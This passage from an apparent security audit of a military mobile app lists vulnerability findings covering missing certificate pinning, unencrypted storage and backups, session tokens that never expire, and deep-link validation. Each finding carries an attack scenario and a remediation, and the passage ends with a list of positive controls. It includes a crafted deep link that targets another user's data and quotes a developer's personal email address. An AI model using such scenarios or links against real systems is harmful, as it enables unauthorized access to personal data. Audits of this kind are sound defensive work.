| **OWASP Mobile Top 10** | M6 |
| **Severity** | Medium |
| **Description** | The `SecureLogger.patchGlobalConsole()` call at `app/_layout.tsx:16` patches console methods at module load time. However, `lib/ctx.tsx:63-66` logs Okta configuration details (issuer URL, client ID, redirect URI) via `console.log`. While these are not PII, this pattern of direct `console.log` usage in authentication code could expand to include sensitive data. More importantly, `services/repositories/LeaveRepository.ts:205` logs `JSON.stringify(error.format())` which could contain Zod validation error details revealing PII field values that failed validation. |
| **Evidence** | `lib/ctx.tsx:63-66` (direct console.log of auth config), `services/repositories/LeaveRepository.ts:205` (logs error details that may contain PII field values), `services/repositories/BilletRepository.ts:87` (logs corrupted billet data including `JSON.stringify(e)`) |
| **Attack Scenario** | A leave request with a malformed emergency contact phone number fails Zod validation. The error details (including the actual phone number) are logged via `console.error('[Integrity Error Details]', JSON.stringify(error.format()))`. |
| **Remediation** | Replace all remaining `console.log/error/warn` calls in `lib/`, `services/`, and `components/` with `SecureLogger` equivalents. For Zod validation errors, log only the field names that failed, not the values. Audit all `JSON.stringify(error)` calls to ensure they do not serialize PII. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-009: No Certificate Pinning

| Field | Content |
|-------|---------|
| **ID** | SEC-009 |
| **Title** | HTTP client has no certificate pinning for API endpoints |
| **MASVS Control** | MASVS-NETWORK-2 |
| **OWASP Mobile Top 10** | M5 |
| **Severity** | Medium (current) / High (production) |
| **Description** | The `HttpClient` in `services/api/client.ts` uses standard `fetch()` without certificate pinning. For a military application handling CUI, DISA STIG SRG-APP-000380 requires certificate pinning for connections to DoD servers. |
| **Evidence** | `services/api/client.ts:187` (standard fetch with no pinning), `docs/ATO_READINESS.md:78` (acknowledged gap) |
| **Attack Scenario** | A MITM attacker on an untrusted network (common in DIL environments) with a rogue CA certificate intercepts API traffic, reading or modifying PII in transit. |
| **Remediation** | Implement certificate pinning using a native module (e.g., `react-native-ssl-pinning` or custom native module). Pin to the DoD CA certificate or specific server certificate. Implement pin rotation strategy. This is blocked on backend certificate provisioning. |
| **Effort** | M |
| **Dependencies** | Backend required (DoD TLS certificate must be provisioned) |

### SEC-010: No Jailbreak/Root Detection

| Field | Content |
|-------|---------|
| **ID** | SEC-010 |
| **Title** | App runs on compromised (jailbroken/rooted) devices without detection |
| **MASVS Control** | MASVS-RESILIENCE-1, MASVS-RESILIENCE-3 |
| **OWASP Mobile Top 10** | M7 |
| **Severity** | Medium |
| **Description** | No jailbreak (iOS) or root (Android) detection is implemented. On a compromised device, other apps can access the SQLite database, AsyncStorage, and expo-secure-store data. |
| **Evidence** | No `jail-monkey`, `react-native-device-info` root detection, or custom integrity checks found in codebase |
| **Attack Scenario** | A sailor installs the app on a jailbroken personal device. Malware on the device reads the unencrypted SQLite database containing the sailor's PII and PCS movement data. |
| **Remediation** | Implement device integrity checks using `expo-device` or a dedicated library. On detection, warn the user and restrict PII display. Consider integration with MDM/MAM (Mobile Device Management / Mobile Application Management) for government device compliance. |
| **Effort** | M |
| **Dependencies** | Client-only (detection), Infra required (MDM integration) |

### SEC-011: Overprivileged Android Permissions

| Field | Content |
|-------|---------|
| **ID** | SEC-011 |
| **Title** | RECORD_AUDIO permission declared without corresponding feature |
| **MASVS Control** | MASVS-PLATFORM-1 |
| **OWASP Mobile Top 10** | M8 |
| **Severity** | Low |
| **Description** | `app.json` declares `android.permission.RECORD_AUDIO` but no audio recording feature exists in the codebase. This violates the principle of least privilege. Similarly, `NSContactsUsageDescription` is declared on iOS but no contact access feature is implemented. |
| **Evidence** | `app.json:41` (RECORD_AUDIO), `app.json:27` (NSContactsUsageDescription) |
| **Attack Scenario** | The overprivileged permission increases the app's attack surface. If a vulnerability allows arbitrary code execution, the attacker could activate the microphone. ATO reviewers will flag unnecessary permissions. |
| **Remediation** | Remove `android.permission.RECORD_AUDIO` from `app.json`. Remove `NSContactsUsageDescription` if contacts feature is not planned. Audit all declared permissions against actual feature usage. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-012: Web Storage Lacks Zod Validation

| Field | Content |
|-------|---------|
| **ID** | SEC-012 |
| **Title** | Web storage implementations bypass Zod schema validation on read |
| **MASVS Control** | MASVS-CODE-1 |
| **OWASP Mobile Top 10** | M4 |
| **Severity** | Medium |
| **Description** | The SQLite repositories properly validate data through Zod schemas on read (`UserSchema.parse()`, `LeaveRequestSchema.parse()`). However, the web storage implementations in `storage.web.ts` and `WebHelpers.getItem()` perform raw `JSON.parse()` without Zod validation. `WebLeaveRepository` in `LeaveRepository.ts:323-358` also skips validation. This creates an inconsistent trust boundary where web clients accept potentially corrupted or tampered data. |
| **Evidence** | `services/db/DatabaseManager.ts:64` (raw JSON.parse), `services/storage.web.ts:47` (raw JSON.parse after disabled decrypt), `services/repositories/LeaveRepository.ts:329` (WebLeaveRepository.getLeaveRequest returns raw parse) |
| **Attack Scenario** | An attacker modifies localStorage data (via browser devtools, XSS, or extension) to inject malformed data. The app trusts this data without validation, potentially causing crashes, logic errors, or injection attacks in downstream rendering. |
| **Remediation** | Add Zod validation to all web storage read paths. Create a shared validation layer used by both SQLite and web repositories. Consider making `WebHelpers.getItem` accept a Zod schema parameter for automatic validation. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-013: No Data Backup Exclusion

| Field | Content |
|-------|---------|
| **ID** | SEC-013 |
| **Title** | App data included in device backups (iCloud, Android auto-backup) |
| **MASVS Control** | MASVS-STORAGE-5 |
| **OWASP Mobile Top 10** | M9 |
| **Severity** | Medium |
| **Description** | No configuration exists to exclude the SQLite database or AsyncStorage from device backups. On iOS, data is included in iCloud backups by default. On Android, auto-backup includes app data. Unencrypted PII in these backups could be accessed from a compromised iCloud/Google account. |
| **Evidence** | `app.json` (no backup exclusion configuration), no `android:allowBackup="false"` in manifest |
| **Attack Scenario** | A sailor's iCloud account is compromised. The attacker downloads the device backup containing the unencrypted My Compass SQLite database with all cached PII. |
| **Remediation** | For iOS: mark database files with `NSURLIsExcludedFromBackupKey`. For Android: configure `android:allowBackup="false"` or use backup rules to exclude sensitive data. In Expo, this can be configured via `app.json` plugins or `app.config.js`. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-014: Session Token Has No Expiration

| Field | Content |
|-------|---------|
| **ID** | SEC-014 |
| **Title** | Mock session token persists indefinitely without expiration or refresh |
| **MASVS Control** | MASVS-AUTH-2 |
| **OWASP Mobile Top 10** | M3 |
| **Severity** | Medium |
| **Description** | The mock access token `'mock-okta-access-token'` stored via `useStorageState` persists in secure store (native) or localStorage (web) indefinitely. There is no token expiration check, no refresh token flow, and no periodic re-validation. While the idle timeout (10 min) provides some session protection, a stolen token from device storage would grant indefinite access. |
| **Evidence** | `lib/ctx.tsx:75` (no expiration on token), `lib/useStorageState.ts` (no TTL check), `components/navigation/AuthGuard.tsx:41` (checks existence only) |
| **Attack Scenario** | An attacker extracts the session token from device storage. Even after the user signs out and back in, the old token is still valid (in the current mock implementation). When real auth is implemented, if token expiration checking is not added to AuthGuard, expired tokens could still grant access. |
| **Remediation** | When implementing real auth: validate JWT expiration (`exp` claim) on every route transition. Implement refresh token flow with short-lived access tokens (15 min) and longer-lived refresh tokens. Clear all tokens on sign-out. Add token validation to AuthGuard. |
| **Effort** | M |
| **Dependencies** | Backend required (Okta token configuration) |

### SEC-015: SQL Interpolation in Migrations

| Field | Content |
|-------|---------|
| **ID** | SEC-015 |
| **Title** | String interpolation used in SQL statements for migration version tracking |
| **MASVS Control** | MASVS-CODE-1 |
| **OWASP Mobile Top 10** | M4 |
| **Severity** | Low |
| **Description** | `services/migrations.ts` uses template literals to interpolate values into SQL: `VALUES (1, 0, '${new Date().toISOString()}')` (line 146) and `SET version = ${highestApplied}` (line 187). While these specific values are not user-controlled (Date.toISOString() output and integer), this pattern sets a dangerous precedent and could be exploited if copy-pasted with user input. |
| **Evidence** | `services/migrations.ts:146`, `services/migrations.ts:187` |
| **Attack Scenario** | Low direct risk -- values are not user-controlled. Risk is primarily that this pattern could be copied to contexts with user input. |
| **Remediation** | Refactor to use parameterized queries even for migration SQL. Use `db.runAsync('INSERT ... VALUES (?, ?, ?)', 1, 0, new Date().toISOString())` instead of template literals. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-016: Deep Link Parameter Validation Missing

| Field | Content |
|-------|---------|
| **ID** | SEC-016 |
| **Title** | mycompass:// deep links accepted without parameter validation |
| **MASVS Control** | MASVS-PLATFORM-3 |
| **OWASP Mobile Top 10** | M4 |
| **Severity** | Low |
| **Description** | The `mycompass://` URL scheme is registered and Expo Router handles routing, but there is no validation of incoming deep link parameters. A malicious app could craft deep links to navigate to arbitrary routes or pass unexpected parameters. |
| **Evidence** | `app.json:8` (scheme registered), `config/auth.ts:15` (auth redirect uses scheme), no URL parameter validation found |
| **Attack Scenario** | A malicious app or web page triggers `mycompass://leave/request?userId=OTHER_USER_ID` attempting to access or modify another user's data. While current mock architecture may not be vulnerable, real API integration could expose this. |
| **Remediation** | Add deep link parameter validation in the root layout or a dedicated deep link handler. Validate that route parameters match expected formats. Ensure deep links cannot bypass AuthGuard or consent screen. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-017: Mock PII Data Committed to Repository

| Field | Content |
|-------|---------|
| **ID** | SEC-017 |
| **Title** | Realistic-looking PII in committed mock data files |
| **MASVS Control** | MASVS-PRIVACY-1 |
| **OWASP Mobile Top 10** | M6 |
| **Severity** | Low |
| **Description** | `data/mockProfile.json` contains realistic-looking PII including a DoD ID pattern (`1234567891`), phone numbers, street addresses, names, and beneficiary information. While this is mock data, the patterns could be confused with real PII in automated scanning tools, and the presence of realistic data formats in source code can desensitize developers to real PII leaks. |
| **Evidence** | `data/mockProfile.json:3` (dodId), `data/mockProfile.json:9-10` (phone numbers), `data/mockProfile.json:22-27` (home address), `data/mockProfile.json:89-113` (beneficiaries with names and addresses) |
| **Attack Scenario** | An automated PII scanner flags the repository. Or a developer copies this pattern and inadvertently uses real data in a similar file. |
| **Remediation** | Use obviously fake data patterns (e.g., `dodId: "0000000000"`, phone: "000-000-0000", address: "123 Test St, Anytown, XX 00000"). Add a header comment to mock data files explicitly stating the data is fictional. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-018: No Screenshot/Screen Recording Prevention

| Field | Content |
|-------|---------|
| **ID** | SEC-018 |
| **Title** | No protection against screenshots or screen recording of CUI screens |
| **MASVS Control** | MASVS-STORAGE-4 |
| **OWASP Mobile Top 10** | M6 |
| **Severity** | Medium |
| **Description** | Screens displaying CUI (user profile with DoD ID, emergency contacts, financial data, PCS orders) have no protection against screenshots or screen recording. On Android, `FLAG_SECURE` is not set. On iOS, no screenshot detection or prevention is implemented. |
| **Evidence** | No `FLAG_SECURE` configuration found, no `usePreventScreenCapture` from `expo-screen-capture` in dependencies or code |
| **Attack Scenario** | A malicious observer screenshots the profile screen showing DoD ID, home address, and dependent information. Or screen recording captures the entire PCS wizard flow including financial entitlement calculations. |
| **Remediation** | Add `expo-screen-capture` to dependencies. Use `usePreventScreenCapture()` on screens displaying PII/CUI. On Android, set `FLAG_SECURE` via a native module for windows displaying sensitive data. Consider blanking sensitive fields when app goes to background (AppState listener). |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-019: Personal Developer Email in Build Configuration

| Field | Content |
|-------|---------|
| **ID** | SEC-019 |
| **Title** | Personal Gmail address in EAS build submission configuration |
| **MASVS Control** | MASVS-CODE-3 |
| **OWASP Mobile Top 10** | M8 |
| **Severity** | Low |
| **Description** | `eas.json` contains `"appleId": "matthewcla@gmail.com"` in both development and production submit profiles. For a government application, build signing and submission should use organizational credentials. |
| **Evidence** | `eas.json:49-52` (development submit), `eas.json:56-59` (production submit) |
| **Attack Scenario** | The personal account could be compromised, granting an attacker ability to push malicious updates to the App Store listing. |
| **Remediation** | Use an organizational Apple Developer account for production builds. Move the personal account to development-only configuration. Consider using environment variables for Apple ID in CI/CD. |
| **Effort** | S |
| **Dependencies** | Infra required (organizational Apple Developer account) |

### SEC-020: Sync Queue Stores Payloads in AsyncStorage

| Field | Content |
|-------|---------|
| **ID** | SEC-020 |
| **Title** | Offline mutation queue persists potentially sensitive payloads in AsyncStorage |
| **MASVS Control** | MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M9 |
| **Severity** | Medium |
| **Description** | `SyncQueueService` persists mutation payloads (type `unknown`) to AsyncStorage as JSON strings. These payloads may contain PII from leave requests, user profile updates, or PCS data. AsyncStorage on native is unencrypted, and the sync queue does not encrypt payloads before persistence. |
| **Evidence** | `services/syncQueue.ts:65-86` (enqueue with arbitrary payload), `services/syncQueue.ts:274` (persist to AsyncStorage as JSON), `store/useAssignmentStore.ts:822` (enqueues slate with app IDs) |
| **Attack Scenario** | A leave request submission while offline queues the full request (including emergency contact, leave address, phone number) in AsyncStorage. An attacker with device access reads the queue. |
| **Remediation** | Encrypt sync queue payloads before persistence. Alternatively, store only reference IDs in the queue and look up full data from the encrypted SQLite database at sync time. |
| **Effort** | S |
| **Dependencies** | Client-only |

### SEC-021: WebHelpers.getItem Lacks Type Safety

| Field | Content |
|-------|---------|
| **ID** | SEC-021 |
| **Title** | WebHelpers in DatabaseManager performs unsafe JSON.parse with type assertion |
| **MASVS Control** | MASVS-CODE-1 |
| **OWASP Mobile Top 10** | M4 |
| **Severity** | Low |
| **Description** | `DatabaseManager.ts:62-65` defines `WebHelpers.getItem<T>` which does `JSON.parse(item)` and returns it as type `T` without any runtime validation. This is a type-unsafe cast that trusts localStorage content. |
| **Evidence** | `services/db/DatabaseManager.ts:62-65` |
| **Attack Scenario** | Tampered localStorage data passes type checks at compile time but contains unexpected shapes at runtime, potentially causing logic errors or crashes. |
| **Remediation** | Add Zod schema validation parameter to `getItem`. Return `null` if validation fails. |
| **Effort** | S |
| **Dependencies** | Client-only |

---

## 5. Positive Security Controls

The codebase demonstrates significant security awareness and several controls that should be preserved and extended:

1. **SecureLogger with Global Console Patch** (`utils/logger.ts`, `app/_layout.tsx:16`): The approach of patching the global console at app entry is an excellent defense-in-depth measure. Even if developers use `console.log` directly, the SecureLogger's PII regex patterns will catch SSN and email patterns. This is a strong control that most apps lack entirely.

2. **DoD Consent Banner (AC-8)** (`app/consent.tsx`): Properly implemented with standard DoD boilerplate text, in-memory state that resets every session, gesture blocking (cannot swipe back), and AuthGuard enforcement. This is compliant with NIST SP 800-53 AC-8.

3. **Session Idle Timeout (IA-11)** (`hooks/useIdleTimeout.ts`): Well-implemented with 5-minute warning, 10-minute hard sign-out, AppState-aware background detection, and wall-clock elapsed time checks. Handles edge cases like app backgrounding correctly.

4. **Error Boundary (SI-11)** (`components/AppErrorBoundary.tsx`): Does not expose raw error messages or stack traces. Shows only a generic message with a non-PII reference code. This prevents information leakage through error screens.

5. **Comprehensive Zod Schema Definitions** (`types/schema.ts`, `types/user.ts`): Every domain entity has a Zod schema with proper validation constraints. PII fields are annotated with `@security` JSDoc tags. Schemas are used at the SQLite repository boundary for data integrity validation.

6. **Storage Tier Architecture** (documented in `CLAUDE.md`): The three-tier storage model (expo-secure-store for tokens, SQLite for structured data, AsyncStorage for preferences) demonstrates correct intent even though encryption is currently disabled.

7. **Service Registry Pattern** (`services/api/serviceRegistry.ts`): The dependency-inversion pattern with typed interfaces enables clean mock-to-real transition without touching store code. The HTTP client (`services/api/client.ts`) is production-ready with retry, timeout, abort, and auth token injection.

8. **PII Field Annotations** (`types/user.ts:109-146`): User schema fields are explicitly annotated with `@security PII - STRICTLY FORBIDDEN IN LOGS`, creating documentation that is co-located with the code.

9. **Expo-Secure-Store for Native Token Storage** (`lib/useStorageState.ts:28-34`): On native platforms, session tokens are correctly stored in the platform secure store (Keychain on iOS, Keystore on Android), not in AsyncStorage.

10. **Data Integrity Error Handling** (`services/storage.interface.ts:14-18`): Custom `DataIntegrityError` class with self-healing behavior (corrupted records are deleted and logged) prevents data corruption from cascading.

11. **Offline-First Architecture**: The entire app is designed to function without network connectivity, with cache-first data loading and a sync queue for mutations. This is essential for DIL environments and is a strong architectural foundation.

12. **Parameterized SQL Queries**: Repository classes consistently use parameterized queries (`db.runAsync(sql, ...params)`) rather than string interpolation, with the minor exception noted in SEC-015 (migrations only).

---

*This audit was conducted against the codebase at commit `ba5a8a6` (main branch). Findings reflect the current pre-ATO development state. Many gaps are documented and acknowledged in the project's own `docs/SECURITY_POSTURE.md`, `docs/ATO_READINESS.md`, and `docs/TECHNICAL_DEBT.md`.*
